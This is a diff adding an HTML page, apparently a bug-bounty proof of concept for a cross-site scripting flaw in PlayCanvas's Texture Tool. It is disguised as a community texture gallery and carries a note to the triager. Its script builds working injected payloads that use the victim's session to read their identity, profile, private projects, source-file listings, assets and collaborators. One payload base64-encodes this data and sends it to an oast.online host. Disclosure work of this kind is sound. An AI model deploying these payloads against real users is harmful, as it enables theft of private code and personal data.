@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>PlayCanvas Community Textures</title>
+<style>
+body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;max-width:900px;margin:40px auto;padding:0 20px;background:#fafafa;color:#333}
+h1{font-size:1.5em;color:#1a1a1a;margin-bottom:4px}
+.subtitle{color:#888;font-size:0.95em;margin-bottom:24px}
+.card{background:#fff;border:1px solid #e0e0e0;border-radius:8px;padding:20px 24px;margin:16px 0;box-shadow:0 1px 3px rgba(0,0,0,0.06)}
+.card h3{margin:0 0 6px;font-size:1.15em}
+.card p{color:#555;margin:6px 0 14px;font-size:0.95em}
+a.btn{display:inline-block;color:#fff;padding:10px 22px;border-radius:6px;text-decoration:none;font-size:14px;font-weight:500}
+a.btn.green{background:#2ea44f}
+a.btn.green:hover{background:#268a3e}
+a.btn.blue{background:#1a73e8}
+a.btn.blue:hover{background:#1557b0}
+a.btn.red{background:#d93025}
+a.btn.red:hover{background:#b5221b}
+a.btn.gray{background:#6a737d}
+a.btn.gray:hover{background:#586069}
+.meta{color:#999;font-size:0.85em;margin-top:10px}
+.triage-note{background:#fff3e0;border:1px solid #ffcc80;border-radius:8px;padding:16px 20px;margin:0 0 20px;font-size:0.92em;line-height:1.6}
+.triage-note b{color:#e65100}
+code{background:#e8eaf6;padding:2px 6px;border-radius:3px;font-size:0.9em;color:#283593}
+ol li{margin:6px 0;line-height:1.5}
+pre{background:#1e1e1e;color:#d4d4d4;padding:14px;border-radius:6px;overflow-x:auto;font-size:12px;line-height:1.5}
+.impact{background:#fce4ec;border:1px solid #ef9a9a;border-radius:6px;padding:12px 16px;margin:10px 0;font-size:0.9em}
+</style>
+</head>
+<body>
+
+<div class="triage-note">
+<b>FOR TRIAGER - v5 Impact PoC</b>
+<br><br>
+<b>Quick test (1 minute):</b>
+<ol>
+<li>Log into <a href="https://playcanvas.com" target="_blank">playcanvas.com</a> with any account</li>
+<li>Return to this page and click <b>Test 1</b> below</li>
+<li>In the new tab, press <b>F12</b>, open <b>Console</b></li>
+<li>You will see your <b>complete project list</b> (including private projects) printed from <code>blob:https://playcanvas.com/...</code></li>
+</ol>
+<b>If you have no projects:</b> Create a quick test project at <a href="https://playcanvas.com" target="_blank">playcanvas.com</a> first (takes 30 seconds), then click Test 1 to see it exposed. Set it to <b>Private</b> in settings to confirm private projects are also leaked.
+<br><br>
+<b>Do NOT paste URLs into the address bar.</b> Chrome encodes <code>'</code> to <code>%27</code> there, breaking the injection. Click the link (realistic attack vector).
+</div>
+
+<h1>PlayCanvas Community Textures</h1>
+<p class="subtitle">Free PBR texture packs shared by the community. Click to preview in the Texture Tool.</p>
+
+<div class="card">
+<h3>Test 1: Private Project Enumeration</h3>
+<p>The injected Worker reads your identity via <code>/api/id</code>, then chains to <code>/api/users/{id}/projects</code> to enumerate ALL your projects including <b>private</b> ones. Project names, IDs, privacy flags, and metadata are logged.</p>
+<a class="btn green" id="test1" href="#" target="_blank" rel="noopener">Preview in Texture Tool</a>
+<div class="impact">An attacker receives the full list of your private game projects, their names, and IDs. This is the first step in stealing project source code and assets.</div>
+</div>
+
+<div class="card">
+<h3>Test 2: Full Account Profile Chain</h3>
+<p>Chains <code>/api/id</code> to <code>/api/users/{id}</code> to read the full account profile. Logs all returned fields to console.</p>
+<a class="btn blue" id="test2" href="#" target="_blank" rel="noopener">Preview in Texture Tool</a>
+<div class="meta">Check Console for all fields returned by the authenticated profile endpoint.</div>
+</div>
+
+<div class="card">
+<h3>Test 3: Project Source Code Listing</h3>
+<p>If you have projects, chains to <code>/api/projects/{pid}/repositories/directory/sourcefiles</code> to list every source file. An attacker would then read each file individually to steal the complete project source code.</p>
+<a class="btn blue" id="test3" href="#" target="_blank" rel="noopener">Preview in Texture Tool</a>
+<div class="impact">For PlayCanvas studios and developers, this means theft of proprietary game code, shaders, custom scripts, and 3D asset pipelines.</div>
+</div>
+
+<div class="card">
+<h3>Test 4: Combined Exfiltration</h3>
+<p>Combines identity + profile + projects into one payload and sends all data to an external server as base64. Check Network tab for the outbound request.</p>
+<a class="btn red" id="test4" href="#" target="_blank" rel="noopener">Preview in Texture Tool</a>
+<div class="meta">Network tab: look for GET to <code>oast.online</code>. Decode the base64 path segment to see all stolen data.</div>
+</div>
+
+<div class="card">
+<h3>Control: Clean Load</h3>
+<p>Opens the Texture Tool with no payload. Compare Console output.</p>
+<a class="btn gray" href="https://playcanvas.com/texture-tool/" target="_blank" rel="noopener">Preview in Texture Tool</a>
+<div class="meta">Clean link, no injection.</div>
+</div>
+
+<script>
+var B='https://playcanvas.com/texture-tool/#';
+var E=";void('";
+var O='https://playcanvas.com';
+
+// Test 1: Identity + project enumeration
+var p1=[
+"');",
+"var o='",O,"';",
+"fetch(o+'/api/id',{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(d){",
+  "console.log('=== XSS: USER IDENTITY ===');",
+  "console.log('ID:',d.id,'Username:',d.username,'Name:',d.full_name,'Plan:',d.plan_type);",
+  "fetch(o+'/api/users/'+d.id+'/projects',{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(p){",
+    "console.log('=== XSS: ALL PROJECTS (incl. private) ===');",
+    "if(p.result){",
+      "console.log('Found',p.result.length,'projects:');",
+      "p.result.forEach(function(x,i){console.log('#'+(i+1),x.name,'(ID:'+x.id+', private:'+x.private+')')});",
+    "}else{console.log('Raw response:',JSON.stringify(p))}",
+  "})",
+"})"
+].join('');
+document.getElementById('test1').href=B+p1+E;
+
+// Test 2: Full profile
+var p2=[
+"');",
+"var o='",O,"';",
+"fetch(o+'/api/id',{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(d){",
+  "fetch(o+'/api/users/'+d.id,{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(u){",
+    "console.log('=== XSS: FULL USER PROFILE ===');",
+    "console.log('All fields:',JSON.stringify(u,null,2));",
+    "var keys=Object.keys(u);",
+    "console.log('Fields returned:',keys.join(', '));",
+    "if(u.email)console.log('EMAIL FOUND:',u.email);",
+  "})",
+"})"
+].join('');
+document.getElementById('test2').href=B+p2+E;
+
+// Test 3: Source code listing
+var p3=[
+"');",
+"var o='",O,"';",
+"fetch(o+'/api/id',{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(d){",
+  "fetch(o+'/api/users/'+d.id+'/projects',{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(p){",
+    "if(!p.result||!p.result.length){console.log('No projects found. Create a project first.');return}",
+    "var proj=p.result[0];",
+    "console.log('=== XSS: SOURCE CODE LISTING for',proj.name,'===');",
+    "Promise.all([",
+      "fetch(o+'/api/projects/'+proj.id+'/repositories/directory/sourcefiles',{credentials:'same-origin'}).then(function(r){return r.json()}),",
+      "fetch(o+'/api/projects/'+proj.id+'/assets?branchId=main&limit=100',{credentials:'same-origin'}).then(function(r){return r.json()}),",
+      "fetch(o+'/api/projects/'+proj.id+'/collaborators',{credentials:'same-origin'}).then(function(r){return r.json()})",
+    "]).then(function(a){",
+      "console.log('Source files:',JSON.stringify(a[0],null,2));",
+      "console.log('Assets:',JSON.stringify(a[1],null,2));",
+      "console.log('Collaborators:',JSON.stringify(a[2],null,2));",
+    "})",
+  "})",
+"})"
+].join('');
+document.getElementById('test3').href=B+p3+E;
+
+// Test 4: Exfiltration
+var p4=[
+"');",
+"var o='",O,"';",
+"fetch(o+'/api/id',{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(d){",
+  "fetch(o+'/api/users/'+d.id,{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(u){",
+    "fetch(o+'/api/users/'+d.id+'/projects',{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(p){",
+      "var data={identity:d,profile:u,projects:p};",
+      "var b=btoa(unescape(encodeURIComponent(JSON.stringify(data))));",
+      "console.log('=== XSS: EXFILTRATING ALL DATA ===');",
+      "console.log(JSON.stringify(data,null,2));",
+      "fetch('https://dajrmvhmmo1qfdkbit30gd6qrii54pgnb.oast.online/'+b.substring(0,2000),{mode:'no-cors'});",
+      "console.log('Data sent to attacker server');",
+    "})",
+  "})",
+"})"
+].join('');
+document.getElementById('test4').href=B+p4+E;
+</script>
+
+</body>
+</html>
